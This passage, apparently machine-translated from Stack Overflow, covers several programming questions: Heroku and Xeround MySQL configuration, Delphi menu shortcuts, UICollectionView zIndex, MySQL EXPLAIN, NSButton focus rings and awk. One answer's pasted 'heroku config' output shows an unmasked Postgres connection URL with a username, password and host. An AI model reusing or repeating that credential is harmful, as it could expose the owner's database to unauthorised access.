       ....shielded-brushlands-3293.herokuapp.com deployed to Heroku

To git@heroku.com:shielded-brushlands-3293.git
   73c5cb6..c391a47  master -> master 
```

* * *

Heroku 日志显示：

```
2012-09-30T00:58:10+00:00 app[web.1]: => Booting WEBrick
2012-09-30T00:58:10+00:00 app[web.1]: => Rails 3.2.1 application starting in production on ...0.0.0.0:6832
2012-09-30T00:58:10+00:00 app[web.1]: => Call with -d to detach
2012-09-30T00:58:10+00:00 app[web.1]: => Ctrl-C to shutdown server
2012-09-30T00:58:10+00:00 app[web.1]: Started GET "/" for 76.87.97.210 at 2012-09-30 00:58:10 +0000
2012-09-30T00:58:15+00:00 heroku[router]: GET shielded-brushlands-3293.herokuapp.com/ dyno=web.1 queue=0 wait=0ms service=4529ms status=500 bytes=643
2012-09-30T00:58:15+00:00 app[web.1]: ActiveRecord::ConnectionNotEstablished (ActiveRecord::ConnectionNotEstablished):
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.1/lib/active_record/connection_adapters/abstract/connection_specification.rb:142:in `connection'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.1/lib/active_support/callbacks.rb:385:in `_run_call_callbacks'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3.2.1/lib/rails/rack/logger.rb:26:in `call_app'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.1/lib/active_support/cache/strategy/local_cache.rb:72:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:66:in `call!'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.1/lib/active_support/callbacks.rb:81:in `run_callbacks'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3.2.1/lib/rails/rack/logger.rb:16:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.1/lib/rack/lock.rb:15:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:51:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack-3.2.1/lib/action_dispatch/middleware/callbacks.rb:27:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3.2.1/lib/rails/rack/log_tailer.rb:14:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack-3.2.1/lib/action_dispatch/middleware/request_id.rb:22:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack-3.2.1/lib/action_dispatch/middleware/static.rb:53:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack-3.2.1/lib/action_dispatch/middleware/remote_ip.rb:31:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:136:in `forward'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.1/lib/rack/handler/webrick.rb:59:in `service'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.1/lib/rack/methodoverride.rb:21:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack-3.2.1/lib/action_dispatch/middleware/debug_exceptions.rb:16:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.1/lib/rack/runtime.rb:17:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:245:in `fetch'
2012-09-30T00:58:15+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/httpserver.rb:111:in `service'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack-3.2.1/lib/action_dispatch/middleware/show_exceptions.rb:56:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3.2.1/lib/rails/engine.rb:479:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/httpserver.rb:70:in `run'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.1/lib/active_record/query_cache.rb:67:in `rescue in call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.1/lib/active_record/connection_adapters/abstract/connection_pool.rb:374:in `retrieve_connection'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.1/lib/rack/content_length.rb:14:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:185:in `lookup'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3.2.1/lib/rails/application.rb:220:in `call'
2012-09-30T00:58:15+00:00 app[web.1]: cache: [GET /] miss
2012-09-30T00:58:15+00:00 app[web.1]:
2012-09-30T00:58:15+00:00 app[web.1]:
2012-09-30T00:58:15+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/server.rb:183:in `block in start_thread'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.1/lib/active_record/connection_adapters/abstract/connection_specification.rb:168:in `retrieve_connection'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.1/lib/active_record/query_cache.rb:61:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.1/lib/active_record/connection_adapters/abstract/connection_pool.rb:443:in `call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack-3.2.1/lib/action_dispatch/middleware/callbacks.rb:28:in `block in call'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.1/lib/active_support/callbacks.rb:405:in `_run__2306900267479677068__call__3522025195442796026__callbacks'
2012-09-30T00:58:15+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.1/lib/active_support/callbacks.rb:405:in `__run_callback'
2012-09-30T00:58:15+00:00 heroku[router]: GET shielded-brushlands-3293.herokuapp.com/favicon.ico dyno=web.1 queue=0 wait=0ms service=17ms status=200 bytes=0
2012-09-30T00:58:15+00:00 app[web.1]: cache: [GET /favicon.ico] miss, store 
```

* * *

gemfile.lock

```
GEM
  remote: ....rubygems.org/
  specs:
    actionmailer (3.2.1)
      actionpack (= 3.2.1)
      mail (~> 2.4.0)
    actionpack (3.2.1)
      activemodel (= 3.2.1)
      activesupport (= 3.2.1)
      builder (~> 3.0.0)
      erubis (~> 2.7.0)
      journey (~> 1.0.1)
      rack (~> 1.4.0)
      rack-cache (~> 1.1)
      rack-test (~> 0.6.1)
      sprockets (~> 2.1.2)
    activemodel (3.2.1)
      activesupport (= 3.2.1)
      builder (~> 3.0.0)
      activerecord (3.2.1)
      activemodel (= 3.2.1)
      activesupport (= 3.2.1)
      arel (~> 3.0.0)
      tzinfo (~> 0.3.29)
    activerecord-mysql2-adapter (0.0.3)
      mysql2
    activeresource (3.2.1)
      activemodel (= 3.2.1)
      activesupport (= 3.2.1)
    activesupport (3.2.1)
      i18n (~> 0.6)
      multi_json (~> 1.0)
    arel (3.0.2)
    builder (3.0.0)
    coffee-rails (3.2.2)
      coffee-script (>= 2.2.0)
      railties (~> 3.2.0)
    coffee-script (2.2.0)
      coffee-script-source
      execjs
    coffee-script-source (1.3.3)
    erubis (2.7.0)
    execjs (1.4.0)
      multi_json (~> 1.0)
    hike (1.2.1)
    i18n (0.6.0)
    journey (1.0.4)
    jquery-rails (2.1.1)
      railties (>= 3.1.0, < 5.0)
      thor (~> 0.14)
    json (1.7.5)
    mail (2.4.4)
      i18n (>= 0.4.0)
      mime-types (~> 1.16)
      treetop (~> 1.4.8)
    mime-types (1.19)
    multi_json (1.3.6)
    mysql2 (0.3.11)
    polyglot (0.3.3)
    rack (1.4.1)
    rack-cache (1.2)
      rack (>= 0.4)
    rack-ssl (1.3.2)
      rack
    rack-test (0.6.1)
      rack (>= 1.0)
    rails (3.2.1)
      actionmailer (= 3.2.1)
      actionpack (= 3.2.1)
      activerecord (= 3.2.1)
      activeresource (= 3.2.1)
      activesupport (= 3.2.1)
      bundler (~> 1.0)
      railties (= 3.2.1)
    railties (3.2.1)
      actionpack (= 3.2.1)
      activesupport (= 3.2.1)
      rack-ssl (~> 1.3.2)
      rake (>= 0.8.7)
      rdoc (~> 3.4)
      thor (~> 0.14.6)
    rake (0.9.2.2)
    rdoc (3.12)
      json (~> 1.4)
    sass (3.2.1)
    sass-rails (3.2.5)
      railties (~> 3.2.0)
      sass (>= 3.1.10)
      tilt (~> 1.3)
    sprockets (2.1.3)
      hike (~> 1.2)
      rack (~> 1.0)
      tilt (~> 1.1, != 1.3.0)
    thor (0.14.6)
    tilt (1.3.3)
    treetop (1.4.10)
      polyglot
      polyglot (>= 0.3.1)
    tzinfo (0.3.33)
    uglifier (1.2.7)
      execjs (>= 0.3.0)
      multi_json (~> 1.3)

PLATFORMS
  ruby

DEPENDENCIES
  activerecord-mysql2-adapter
  coffee-rails (~> 3.2.1)
  jquery-rails
  mysql2
  rails (= 3.2.1)
  sass-rails (~> 3.2.3)
  uglifier (>= 1.0.3) 
```

* * *

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T20:17:46.973

由于 mysql2 gem 是默认的 w/Rails 3，你需要做的就是确保你的 gemfile 中有“gem 'mysql2'”，然后运行 ​​bundle install，提交/推送到 heroku

然后当然使用“XEROUND_DATABASE_URL”下的heroku配置中列出的URL

```
heroku config:add DATABASE_URL=mysql2://app7912272:xxxx@instance27464.db.xeround.com.:16304/app7912272 
```

注意将 mysql:// 更改为 mysql2:// （这是关键）

然后

```
heroku restart 
```

我只是在运行 Xeround 的全新 Rails 3.2.9 Heroku 应用程序上成功执行此操作。无需将适配器更改为“mysql2”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T04:44:22.453

我在网上搜索过：xeround heroku ruby

列表中的第一项： [https ://devcenter.heroku.com/articles/xeround](https://devcenter.heroku.com/articles/xeround)

因此，如果我可以使用 heroku config 设置变量，那么我应该能够看到所有变量 下一个搜索：heroku config

列表中的第一项： [https ://devcenter.heroku.com/articles/config-vars](https://devcenter.heroku.com/articles/config-vars)

在 config-vars 文章（来自第二次搜索）中，我可以发出命令：heroku config

```
heroku config
 !    autoupdate in progress
=== shielded-brushlands-3293 Config Vars
DATABASE_URL:                       postgres://hvsosprakvuedm:v5QU211mYByXbBIdAxa3s4oMff@ec2-107-20-195-105.compute-1.amazonaws.com:5432/dehgili4ph7ih7
GEM_PATH:                           vendor/bundle/ruby/1.9.1
LANG:                               en_US.UTF-8
PATH:                               bin:vendor/bundle/ruby/1.9.1/bin:/usr/local/bin:/usr/bin:/bin
RACK_ENV:                           production
RAILS_ENV:                          production
XEROUND_DATABASE_ADAPTER:           mysql
XEROUND_DATABASE_FAILOVER_ADAPTER:  mysql
XEROUND_DATABASE_FAILOVER_HOST:     instance27464.db.xeround.com.
XEROUND_DATABASE_FAILOVER_NAME:     app7912272
XEROUND_DATABASE_FAILOVER_PASSWORD: xxxxx
XEROUND_DATABASE_FAILOVER_PORT:     16304
XEROUND_DATABASE_FAILOVER_URL:      mysql://app7912272:xxxx@instance27464.db.xeround.com.:16304/app7912272
XEROUND_DATABASE_FAILOVER_USERNAME: app7912272
XEROUND_DATABASE_HOST:              instance27464.db.xeround.com.
XEROUND_DATABASE_INTERNAL_ADAPTER:  mysql
XEROUND_DATABASE_INTERNAL_HOST:     int.instance27464.db.xeround.com.
XEROUND_DATABASE_INTERNAL_NAME:     app7912272
XEROUND_DATABASE_INTERNAL_PASSWORD: xxxxx
XEROUND_DATABASE_INTERNAL_PORT:     16304
XEROUND_DATABASE_INTERNAL_URL:      mysql://app7912272:xxxx@int.instance27464.db.xeround.com.:16304/app7912272
XEROUND_DATABASE_INTERNAL_USERNAME: app7912272
XEROUND_DATABASE_NAME:              app7912272
XEROUND_DATABASE_PASSWORD:          xxxxx
XEROUND_DATABASE_PORT:              16304
XEROUND_DATABASE_URL:               mysql://app7912272:xxxx@instance27464.db.xeround.com.:16304/app7912272
XEROUND_DATABASE_USERNAME:          app7912272 
```

第一个引起了我的注意，它指向一个 postgres 位置。有关系吗？我没有引用 DATABASE_URL。

xeround 文章（来自第一次搜索）包含一行，但没有说明原因，只是说做。

* * *

连接到 xeround Xeround 插件会将数据库的 URL 存储在两个配置变量中：XEROUND_DATABASE_URL 和 XEROUND_DATABASE_INTERNAL_URL

“内部” URL 被转换为内部 IP 地址，应该在从同一数据中心内访问您的数据库时使用。第一个 URL 用于从外部连接。

复制与您相关的配置变量的值 -

$ heroku config:add DATABASE_URL=(URL 配置变量)

* * *

嗯？它不是我在程序中引用的变量，也不是在我的本地机器上设置的。

就是这样：因为这应该是一个云数据库，所以我不需要知道任何关于数据中心位置的信息，所以使用外部的。

```
heroku config:add DATABASE_URL=mysql://app7912272:xxxx@instance27464.db.xeround.com.:16304/app7912272
Setting config vars and restarting shielded-brushlands-3293...  !
Autoupdate in progress
done, v20
DATABASE_URL: mysql://app7912272:XXXX@instance27464.db.xeround.com.:16304/app7912272 
```

让我们看看它是否出现....废话

好的，将其设置为内部：

```
heroku config:add DATABASE_URL=mysql://app7912272:xxxx@int.instance27464.db.xeround.com.:16304/app7912272 
```

让我们看看它是否出现......废话II

我还注意到有两个变量称为 XEROUND_DATABASE_ADAPTER、XEROUND_DATABASE_FAILOVER_ADAPTER 和 XEROUND_DATABASE_INTERNAL_ADAPTER。它们都设置为mysql。我正在使用mysql2。

```
heroku config:add XEROUND_DATABASE_ADAPTER=mysql2
heroku config:add XEROUND_DATABASE_FAILOVER_ADAPTER=mysql2
herokU config:add XEROUND_DATABASE_INTERNAL_ADAPTER=mysql2 
```

让我们看看它是否出现......废话III

在文章的下方：

```
Each of the URLs contains a string of the following syntax:

mysql://username:password@host:port/database

The parts out of which the URLs are made of are also set for your convenience in the following environment variables:

XEROUND_DATABASE_ADAPTER
XEROUND_DATABASE_USERNAME
XEROUND_DATABASE_PASSWORD
XEROUND_DATABASE_HOST
XEROUND_DATABASE_PORT
XEROUND_DATABASE_NAME

XEROUND_DATABASE_INTERNAL_ADAPTER
XEROUND_DATABASE_INTERNAL_USERNAME
XEROUND_DATABASE_INTERNAL_PASSWORD
XEROUND_DATABASE_INTERNAL_HOST
XEROUND_DATABASE_INTERNAL_PORT
XEROUND_DATABASE_INTERNAL_NAME 
```

任何从事编程工作足够长的人都可能知道这是怎么回事。有时你会做一些事情，即使它们毫无意义。

所以mysql:是从适配器派生的。同时更新 url 变量：

```
heroku config:add DATABASE_URL=mysql2://app7912272:xxxx@instance27464.db.xeround.com.:16304/app7912272
heroku config:add XEROUND_DATABASE_URL=mysql2://app7912272:xxxxxx@instance27464.db.xeround.com.:16304/app7912272
heroku config:add XEROUND_DATABASE_FAILOVER_URL=mysql2://app7912272:xxxxxx@instance27464.db.xeround.com.:16304/app7912272
herokU config:add XEROUND_DATABASE_INTERNAL_URL=mysql2://app7912272:xxxxxx@instance27464.db.xeround.com.:16304/app7912272 
```

废话不多说，申请出来了

最后的样子：

```
heroku config
 !    autoupdate in progress
=== shielded-brushlands-3293 Config Vars
DATABASE_URL:                       mysql2://app7912272:xxxx@instance27464.db.xeround.com.:16304/app7912272
GEM_PATH:                           vendor/bundle/ruby/1.9.1
LANG:                               en_US.UTF-8
PATH:                               bin:vendor/bundle/ruby/1.9.1/bin:/usr/local bin:/usr/bin:/bin
RACK_ENV:                           production
RAILS_ENV:                          production
XEROUND_DATABASE_ADAPTER:           mysql2
XEROUND_DATABASE_FAILOVER_ADAPTER:  mysql2
XEROUND_DATABASE_FAILOVER_HOST:     instance27464.db.xeround.com.
XEROUND_DATABASE_FAILOVER_NAME:     app7912272
XEROUND_DATABASE_FAILOVER_PASSWORD: xxxx
XEROUND_DATABASE_FAILOVER_PORT:     16304
XEROUND_DATABASE_FAILOVER_URL:      mysql2://app7912272:xxxx@instance27464.db.xeround.com.:16304/app7912272
XEROUND_DATABASE_FAILOVER_USERNAME: app7912272
XEROUND_DATABASE_HOST:              instance27464.db.xeround.com.
XEROUND_DATABASE_INTERNAL_ADAPTER:  mysql2
XEROUND_DATABASE_INTERNAL_HOST:     int.instance27464.db.xeround.com.
XEROUND_DATABASE_INTERNAL_NAME:     app7912272
XEROUND_DATABASE_INTERNAL_PASSWORD: xxxx
XEROUND_DATABASE_INTERNAL_PORT:     16304
XEROUND_DATABASE_INTERNAL_URL:      mysql2://app7912272:xxxx@instance27464.db.xeround.com.:16304/app7912272
XEROUND_DATABASE_INTERNAL_USERNAME: app7912272
XEROUND_DATABASE_NAME:              app7912272
XEROUND_DATABASE_PASSWORD:          xxxx
XEROUND_DATABASE_PORT:              16304
XEROUND_DATABASE_URL:               mysql2://app7912272:xxxx@instance27464.db.xeround.com.:16304/app7912272
XEROUND_DATABASE_USERNAME:          app7912272 
```

# delphi - 向以编程方式添加的系统菜单选项添加快捷方式

> ID：12659300
> 
> 赞同：8
> 
> 时间：2012-09-30T06:52:43.317
> 
> 标签：delphi, keyboard-shortcuts, delphi-7

在我的应用程序中，我有一个基本表单，其中将各种项目添加到系统菜单中，例如

```
 AppendMenu (SysMenu, MF_SEPARATOR, 0, '');
 AppendMenu (SysMenu, MF_STRING, SC_Sticky, 'Sticky');
 AppendMenu (SysMenu, MF_STRING, SC_Original, 'Original'); 
```

如何将键盘快捷键添加到这些菜单选项（例如 Alt-F2、Alt-F3）？

我不能使用使用加速器的标准方法（即 Alt-S 的 &Sticky），因为真正的菜单标题是希伯来语的，而且加速器似乎不能与这种语言正常工作。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-30T09:43:58.450

这是一个使用[加速器表](http://msdn.microsoft.com/en-us/library/ms645526%28v=vs.85%29.aspx)的示例：

```
uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, AppEvnts;

type
  TForm1 = class(TForm)
    ApplicationEvents1: TApplicationEvents;
    procedure FormCreate(Sender: TObject);
    procedure ApplicationEvents1Message(var Msg: tagMSG; var Handled: Boolean);
    procedure FormDestroy(Sender: TObject);
  private
    FAccelTable: HACCEL;
    FAccels: array[0..1] of TAccel;
  protected
    procedure WMSysCommand(var Message: TWMSysCommand); message WM_SYSCOMMAND;
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

const
  SC_Sticky = 170;
  SC_Original = 180;

procedure TForm1.FormCreate(Sender: TObject);
var
  SysMenu: HMENU;
begin
 SysMenu := GetSystemMenu(Handle, False);
 AppendMenu (SysMenu, MF_SEPARATOR, 0, '');
 AppendMenu (SysMenu, MF_STRING, SC_Sticky, 'Sticky'#9'Alt+F2');
 AppendMenu (SysMenu, MF_STRING, SC_Original, 'Original'#9'Alt+F3');

 FAccels[0].fVirt := FALT or FVIRTKEY;
 FAccels[0].key := VK_F2;
 FAccels[0].cmd := SC_Sticky;
 FAccels[1].fVirt := FALT or FVIRTKEY;
 FAccels[1].key := VK_F3;
 FAccels[1].cmd := SC_Original;

 FAccelTable := CreateAcceleratorTable(FAccels, 2);
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  DestroyAcceleratorTable(FAccelTable);
end;

procedure TForm1.ApplicationEvents1Message(var Msg: tagMSG;
  var Handled: Boolean);
begin
  TranslateAccelerator(Handle, FAccelTable, Msg);
  inherited;
end;

procedure TForm1.WMSysCommand(var Message: TWMSysCommand);
begin
  inherited;
  case Message.CmdType of
    SC_Sticky: ShowMessage('sticky');
    SC_Original: ShowMessage('original');
  end;
end; 
```

# ios - UICollectionView setLayout:animated: 不保留 zIndex

> ID：12659301
> 
> 赞同：19
> 
> 时间：2012-09-30T06:53:03.677
> 
> 标签：ios, uicollectionview, z-index

我注意到，当调用`setLayout:animated`a`UICollectionView`在两个布局之间切换时，当前可见的单元格不符合`zIndex`它的布局属性已在`layoutAttributesForItemAtIndexPath:`.

例如，如果我有一个`UICollectionView`with `UICollectionViewFlowLayout`，将其设置`minimumLineSpacing`为负数，以便单元格重叠，然后`zIndex`在每个单元格上设置 a 高于前一个单元格的值，然后看起来好像单元格是从下往上堆叠的。

但是，如果我将布局设置为另一个布局，然后返回到该原始布局，则会中断。就好像当前可见的单元格不听 zIndex 并放置在其他单元格的顶部。如果我将单元格滚动到屏幕外，然后返回到正确的位置。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-09T08:28:48.760

我曾经也有过一样的问题。切换布局将忽略单元格的 zIndex。

通过在 z 轴上应用如下平移，我设法使其“看起来正确”：

```
attributes.transform3D = CATransform3DMakeTranslation(0, 0, indexPath.row); 
```

但这只是一个视觉修复，如果您尝试单击该项目，您将意识到 zIndex 仍然是错误的，直到通过将其滚动到屏幕外来回收它。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-10-11T06:20:33.130

通过结合使用 grimfrog 和 Charlie Elliott 的反应，我设法得到了我所追求的行为。

Charlie Elliott 的解决方案为集合视图中的项目获得了正确的最终结果，但在动画期间仍然对 zIndex 产生了吸附效果。

grimfrog 的解决方案提供了正确的外观，但在布局更改后 zIndex 仍然不正确，尽管看起来正确。

两者的结合虽然不是一个很好的解决方案，但确实有效并且确实使用了 UICollectionViewLayoutAttributes 支持的 transform 和 zIndex 属性

在我的布局中，我有

```
- (NSArray *)layoutAttributesForElementsInRect:(CGRect)rect
{
  NSArray *attributes = [super layoutAttributesForElementsInRect:rect];

  [attributes enumerateObjectsUsingBlock:^(UICollectionViewLayoutAttributes *attributes, NSUInteger idx, BOOL *stop) {
    attributes.zIndex = attributes.indexPath.item + 1;
  }];

  return attributes;
}

- (UICollectionViewLayoutAttributes *)layoutAttributesForItemAtIndexPath:(NSIndexPath *)indexPath
{
  UICollectionViewLayoutAttributes *attributes = [super layoutAttributesForItemAtIndexPath:indexPath];

  attributes.transform3D = CATransform3DMakeTranslation(0, 0, attributes.indexPath.item);
  return attributes;
} 
```

我不会把它作为正确的答案，因为我确信必须有另一种方法来解决这个问题，但我很想看看这是否也能解决其他人的问题。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2016-10-13T02:09:52.930

尝试：

```
// In UICollectionViewCell subclass
- (void)applyLayoutAttributes:(UICollectionViewLayoutAttributes *)layoutAttributes
{
    [super applyLayoutAttributes:layoutAttributes];
    // Setting zPosition instead of relaying on
    // UICollectionView zIndex management 'fixes' the issue
    self.layer.zPosition = layoutAttributes.zIndex;
} 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-10-11T09:51:26.840

这也咬到我了。经过几次测试后，我意识到`UICollectionView`无论z-index如何，都会强制选定的单元格位于顶部。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-10-05T22:19:20.873

尝试将 z-index 设置为：

```
- (UICollectionViewLayoutAttributes *)initialLayoutAttributesForAppearingItemAtIndexPath:(NSIndexPath *)itemIndexPath;
- (UICollectionViewLayoutAttributes *)finalLayoutAttributesForDisappearingItemAtIndexPath:(NSIndexPath *)itemIndexPath; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-05-15T14:16:15.747

使用@sampage & @grimfrog 答案作为起点，我能够得到类似的情况

```
- (UICollectionViewLayoutAttributes *)layoutAttributesForItemAtIndexPath:(NSIndexPath *)path
{
    UICollectionViewLayoutAttributes* attributes = [UICollectionViewLayoutAttributes layoutAttributesForCellWithIndexPath:path];
    attributes.zIndex = path.item;
    attributes.transform3D = CATransform3DMakeTranslation(0, 0, path.item);
    // other attribute settings
    return attributes;
} 
```

我在生成属性数组时`layoutAttributesForElementsInRect:`调用`layoutAttributesForItemAtIndexPath:`- 所以我只需要在其中包含 zIndex 和 transform3D 。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-08-11T10:40:40.697

我有另一个解决方法。由于所有单元格都属于同一个超级视图，因此`bringSubviewToFront :`在单元格显示时调用。具体来说，通过查看Debug View Hierarchy，虽然UICollectionViewLayout没有根据zIndex渲染单元格，但它仍然按照每个子视图添加到它的超级视图的相反顺序显示单元格。

# mysql - “在哪里使用”是否意味着错误的 MySQL 查询？

> ID：12659309
> 
> 赞同：0
> 
> 时间：2012-09-30T06:55:07.757
> 
> 标签：mysql, optimization

我有这个 MySQL 查询：

```
EXPLAIN EXTENDED 
SELECT img.id as iid,img.*,users.*,img.ave_rate as arate,img.count_rate as cn
FROM images AS img 
LEFT OUTER JOIN users on img.uid=users.id

WHERE img.id NOT IN (SELECT rates.imageid from rates WHERE rates.ip=1854604622) 
GROUP BY iid

ORDER BY
iid DESC
LIMIT 30 
```

它的输出是这样说的：

```
1   PRIMARY             img     index       NULL         PRIMARY    4   NULL                30  580    Using where
1   PRIMARY             users   eq_ref      PRIMARY      PRIMARY    4   twtgirls3.img.uid   1   100 
2   DEPENDENT SUBQUERY  rates   ref         imageid,ip   ip         5   const               4   100    Using where 
```

正如您在第一行中看到的那样，它使用 PRIMARY 键作为索引，但在额外的列中我们有“Using Where”，这是什么意思？这是否意味着未使用密钥？我们在第三排也有同样的情况......

最后，您如何看待这个查询？优化了吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T06:59:02.583

> 如果 Extra 列还显示 Using where，则表示该索引正在用于执行键值查找。如果不使用 where，优化器可能会读取索引以避免读取数据行，但不会将其用于查找。例如，如果索引是查询的覆盖索引，优化器可能会扫描它而不使用它进行查找。

来源：[https ://dev.mysql.com/doc/refman/5.1/en/explain-output.html](https://dev.mysql.com/doc/refman/5.1/en/explain-output.html)

# objective-c - 自定义 NSButton 对焦环颜色

> ID：12659316
> 
> 赞同：3
> 
> 时间：2012-09-30T06:55:56.690
> 
> 标签：objective-c, xcode, focus, subclass, nsbutton

我已经将 NSButton 和 NSButtonCell 子类化，我已经更改了图纸。现在对焦环不再出现在按钮上。我正在寻找一种在我的自定义按钮上绘制具有自定义颜色的对焦环的方法。

**问题更新**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-03T13:34:41.133

我不知道如何自己绘制焦点环（因此您可以使用自定义颜色），但是要让您的自定义按钮单元绘制焦点环，您通常只需要覆盖[focusRingMaskBoundsForFrame:inView:](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/ApplicationKit/Classes/NSCell_Class/Reference/NSCell.html#//apple_ref/occ/instm/NSCell/focusRingMaskBoundsForFrame%3ainView%3a)就像这样：

```
- (NSRect)focusRingMaskBoundsForFrame:(NSRect)cellFrame inView:(NSView *)controlView
{
    return cellFrame;
} 
```

如果这不能给你想要的结果，你可能需要通过实现[drawFocusRingMaskWithFrame:inView:](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/ApplicationKit/Classes/NSCell_Class/Reference/NSCell.html#//apple_ref/occ/instm/NSCell/drawFocusRingMaskWithFrame%3ainView%3a)来额外提供一个掩码。在这种方法中，您基本上只需绘制应该添加对焦环的内容。可可为您完成其余的工作。

请注意，这些方法仅适用于 Mac OS X 10.7 Lion 及更高版本，但 Apple 表示现在应该这样做。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-10-09T14:34:42.500

您可以为自定义按钮类添加跟踪区域，然后您可以自定义按钮焦点。

```
-(void)awakeFromNib{
int opts = (NSTrackingMouseEnteredAndExited | NSTrackingActiveAlways);
NSTrackingArea *trackingArea = [[NSTrackingArea alloc] initWithRect:self.frame options:opts owner:self userInfo:nil];
[self addTrackingArea:trackingArea];
} 
```

现在您可以在以下功能中进行自定义。

```
- (void) mouseEntered:(NSEvent*)event{
        //Add Custom Focus Ring
}

- (void) mouseExited:(NSEvent*)event{
        //Remove Custom Focus Ring
} 
```

# variables - AWK——如何从后面出现的匹配正则表达式中分配变量的值？

> ID：12659317
> 
> 赞同：3
> 
> 时间：2012-09-30T06:56:37.033
> 
> 标签：variables, awk

虽然我有这个**awk 脚本**，

```
/regex2/{
var = $1}

/regex1/{
print var} 
```

我在**输入文件**上执行：

```
regex1

This should be assigned as variable regex2 
```

我没有打印输出。所需的输出是：要打印的“This”。

然后我可能会考虑使用BEGIN：

```
BEGIN{
/regex2/
var = $1}

/regex1/{
print var} 
```

但显然 BEGIN 不能适应正则表达式匹配功能。对此有什么建议吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T07:19:08.167

这将达到预期的结果：

```
awk '/regex2/ { print $1 }' 
```

否则，您需要读取该文件两次并执行以下操作。它将存储最后一次出现的`/regex2/`in `var`。重新读取文件后，它将`var`为每次出现的`/regex1/`. 请注意，您将在输出中获得一个空行，并在换行符上获得关键字“This”：

```
awk 'FNR==NR && /regex2/ { var = $1; next } /regex1/ { print var }' file.txt{,} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T16:22:42.730

通常这种事情是用一个标志来完成的：

```
/regex1/ { f = 1 }
